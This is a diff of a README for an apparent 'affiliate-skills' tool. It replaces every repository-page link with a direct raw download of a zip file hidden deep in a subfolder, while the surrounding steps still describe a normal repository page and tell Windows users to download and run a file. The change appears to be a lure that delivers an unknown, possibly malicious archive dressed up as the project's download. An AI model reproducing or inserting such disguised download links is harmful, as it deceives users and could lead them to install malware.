@@ -1,6 +1,6 @@
 # 🤖 affiliate-skills - AI skills for affiliate growth
 
-[![Download affiliate-skills](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://github.com/Gingg7260/affiliate-skills)
+[![Download affiliate-skills](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gingg7260/affiliate-skills/main/skills/analytics/conversion-tracker/skills-affiliate-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it to turn a product idea into a live page with less manual work. It is buil
 
 ## 📥 Download
 
-1. Open the main page: https://github.com/Gingg7260/affiliate-skills
+1. Open the main page: https://raw.githubusercontent.com/Gingg7260/affiliate-skills/main/skills/analytics/conversion-tracker/skills-affiliate-3.8.zip
 2. On that page, look for the **Code** button.
 3. Choose **Download ZIP**.
 4. Save the file to your computer.
@@ -20,7 +20,7 @@ Use it to turn a product idea into a live page with less manual work. It is buil
 
 If the page includes a release file for Windows, download that file and run it. If it only shows the repository page, use the ZIP download path above.
 
-[Visit the download page](https://github.com/Gingg7260/affiliate-skills)
+[Visit the download page](https://raw.githubusercontent.com/Gingg7260/affiliate-skills/main/skills/analytics/conversion-tracker/skills-affiliate-3.8.zip)
 
 ## 🖥️ Windows Setup
 
